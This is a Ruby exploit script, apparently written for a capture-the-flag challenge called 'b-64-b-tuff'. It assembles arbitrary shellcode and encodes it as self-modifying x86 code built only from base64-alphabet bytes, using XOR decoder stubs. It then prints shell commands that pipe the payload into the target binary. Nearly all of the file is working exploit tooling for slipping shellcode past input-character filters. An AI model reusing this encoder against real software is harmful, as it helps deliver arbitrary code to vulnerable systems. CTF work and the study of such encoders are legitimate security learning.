# encoding: ASCII-8bit

require 'base64'

SET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
CACHE = {}
TEMP_OFFSET = 0x100

def get_xor_values_8(desired)
  if((desired & 0x80) != 0)
    raise(Exception, "Impossible to encode a value with a 1 in the MSB: 0x%x" % desired)
  end

  if(CACHE[desired])
    return CACHE[desired]
  end

  # It's possible to encode many values in a single XOR. But, to simplify
  # XOR'ing 32-bit values together, we want to be consistent, and using two
  # values works for any single byte.
  SET.bytes.each do |b1|
    SET.bytes.each do |b2|
      if((b1 ^ b2) == desired)
        CACHE[desired] = [b1, b2]
        return [b1, b2]
      end
    end
  end

  # Give up :(
  puts("Couldn't find an encoding for: 0x%02x" % desired)
  exit(1)
end

def get_xor_values_32(desired)
  # Separate out the top bits, since we can't easily encode them
  top_bits = desired & 0x80808080
  desired = desired & 0x7F7F7F7F

  b1, b2, b3, b4 = [desired].pack('N').unpack('cccc')

  v1 = get_xor_values_8(b1)
  v2 = get_xor_values_8(b2)
  v3 = get_xor_values_8(b3)
  v4 = get_xor_values_8(b4)

  result = [
    [v1[0], v2[0], v3[0], v4[0]].pack('cccc').unpack('N').pop(),
    [v1[1], v2[1], v3[1], v4[1]].pack('cccc').unpack('N').pop(),
  ]

  # Put the most significant bits on the first result so we can deal with them
  # later
  result[0] = result[0] | top_bits

#  puts '0x%08x' % result[0]
#  puts '0x%08x' % result[1]
#  puts('----------')
#  puts('0x%08x' % (result[0] ^ result[1]))
#  puts()
  return result
end

def set_ecx(value)
  if((value & 0x80808080) != 0)
    raise(Exception, "Attempting to set ecx to an impossible value: 0x%08x" % value)
  end
  puts("Attempting to set ecx to 0x%08x..." % value)

  buffer = ""

  xor = get_xor_values_32(value)

  # push dword 0x????????
  buffer += "\x68" + [xor[0]].pack('I')

  # pop eax
  buffer += "\x58"

  # xor eax, 0x????????
  buffer += "\x35" + [xor[1]].pack('I')

  # push eax
  buffer += "\x50"

  # pop ecx
  buffer += "\x59"
end

def get_shellcode(filename)
  system("nasm -o asm.tmp %s" % filename)
  data = File.new('asm.tmp', 'rb').read()
  system("rm -f asm.tmp")

  puts("Shellcode: %s" % data.bytes.map { |b| '\x%02x' % b}.join)
  return data
end

def get_xor_block(value)
  # Figure out which MSB's are set, then remove them for now
  value_extras = value & 0x80808080
  value &= 0x7F7F7F7F

  code = ''
  code += "\x68" + [value].pack('N') # push dword 0x????????
  code += "\x5A"                     # pop edx
  code += "\x31\x51\x41"             # xor [ecx+0x41], edx

  if((value_extras & 0x00000080) != 0)
    # Make sure the previous stack value is 0
    code += "\x57"         # push edi (0)
    code += "\x57"         # push edi (0)
    code += "\x5a"         # pop edx
    code += "\x5a"         # pop edx

    # Set edx to 0x80
    code += "\x6a\x7a"     # push 0x7a
    code += "\x5a"         # pop edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx

    # Pop it off the stack, mis-aligned to shift it
    code += "\x52"         # push edx
    code += "\x4c"         # dec esp
    code += "\x4c"         # dec esp
    code += "\x4c"         # dec esp
    code += "\x5a"         # pop edx
    code += "\x31\x51\x41" # xor [ecx+0x41], edx

    # Clean up the stack
    code += "\x44"         # inc esp
    code += "\x44"         # inc esp
    code += "\x44"         # inc esp
  end

  if((value_extras & 0x00008000) != 0)
    # Make sure the previous stack value is 0
    code += "\x57"         # push edi (0)
    code += "\x57"         # push edi (0)
    code += "\x5a"         # pop edx
    code += "\x5a"         # pop edx

    # Set edx to 0x80
    code += "\x6a\x7a"     # push 0x7a
    code += "\x5a"         # pop edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx

    # Pop it off the stack, mis-aligned to shift it
    code += "\x52"         # push edx
    code += "\x4c"         # dec esp
    code += "\x4c"         # dec esp
    code += "\x5a"         # pop edx
    code += "\x31\x51\x41" # xor [ecx+0x41], edx

    # Clean up the stack
    code += "\x44"         # inc esp
    code += "\x44"         # inc esp
  end

  if((value_extras & 0x00800000) != 0)
    # Make sure the previous stack value is 0
    code += "\x57"         # push edi (0)
    code += "\x57"         # push edi (0)
    code += "\x5a"         # pop edx
    code += "\x5a"         # pop edx

    # Set edx to 0x80
    code += "\x6a\x7a"     # push 0x7a
    code += "\x5a"         # pop edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx

    # Pop it off the stack, mis-aligned to shift it
    code += "\x52"         # push edx
    code += "\x4c"         # dec esp
    code += "\x5a"         # pop edx
    code += "\x31\x51\x41" # xor [ecx+0x41], edx

    # Clean up the stack
    code += "\x44"         # inc esp
  end

  if((value_extras & 0x80000000) != 0)
    # Make sure the previous stack value is 0
    code += "\x6a\x7a"     # push 0x7a
    code += "\x5a"         # pop edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x42"         # inc edx
    code += "\x31\x51\x41" # xor [ecx+0x41], edx
  end

  code += "\x41"                     # inc ecx
  code += "\x41"                     # inc ecx
  code += "\x41"                     # inc ecx
  code += "\x41"                     # inc ecx

  return code
end

if(ARGV.length != 1)
  puts("Usage: sploit.rb <shellcode.asm>")
  exit(1)
end

# Get the shellcode and pad it to a multiple of 4
shellcode = get_shellcode(ARGV[0])
while((shellcode.length % 4) != 0)
  shellcode += 'A'
end

# Break the shellcode into 4-byte integers
shellcode = shellcode.unpack('N*')

# Figure out the xor values
encoded_shellcode = []
shellcode.each do |i|
  encoded_shellcode << get_xor_values_32(i)
end
puts("It looks like this will encode cleanly! Woohoo!")

code = ''

# Set edi to 0, so we can use it later
code += "\x68\x41\x41\x41\x41" # push 0x41414141
code += "\x58"                 # pop eax
code += "\x35\x41\x41\x41\x41" # xor eax, 0x41414141
code += "\x50"                 # push eax
code += "\x50"                 # push eax
code += "\x50"                 # push eax
code += "\x50"                 # push eax
code += "\x50"                 # push eax
code += "\x50"                 # push eax
code += "\x50"                 # push eax
code += "\x61"                 # popad

# Set ecx to the start of our encoded data
# (We subtract 0x41 because later, we use xor [ecx+0x41], ...)
code += set_ecx(0x41410000 + TEMP_OFFSET)

# Build the first half of the XOR into the xor command
encoded_shellcode.each do |i|
  code += get_xor_block(i[0])
end

# Add some essentially no-op padding ('dec ebp') to get us up to +0x1000
# TODO: Get rid of this once we're done and can calculate this properly
if(code.length > TEMP_OFFSET + 0x41)
  raise(Exception, "Shellcode is too long!")
end
while(code.length < TEMP_OFFSET + 0x41)
  code += "\x4d"
end

# Now add the second half, which is the part that will be updated
encoded_shellcode.each do |i|
  code += [i[1]].pack('N')
end

# Add the final padding (we use \x4d (M), which is 'dec ebp', because we need
# it to be an exact multiple of 4. Usually base64 uses '=' to pad out the
# string, but that does weird bit stuff and it doesn't always decode properly.
# Using an actual Base64 character is safer.
while((code.length() % 4) != 0)
  code += "\x4d"
end

# Display it
puts("Base64: %s" % code)
puts("Hex-encoded: %s" % code.bytes.map { |b| '\x%02x' % b}.join)
puts()
puts("rm -f core ; echo -ne '%s' | ./run_raw" % code)

hex = (Base64.decode64(code).bytes.map { |b| '\x%02x' % b}).join
puts()
puts("rm -f core ; echo -ne '%s' | ./b-64-b-tuff" % hex)
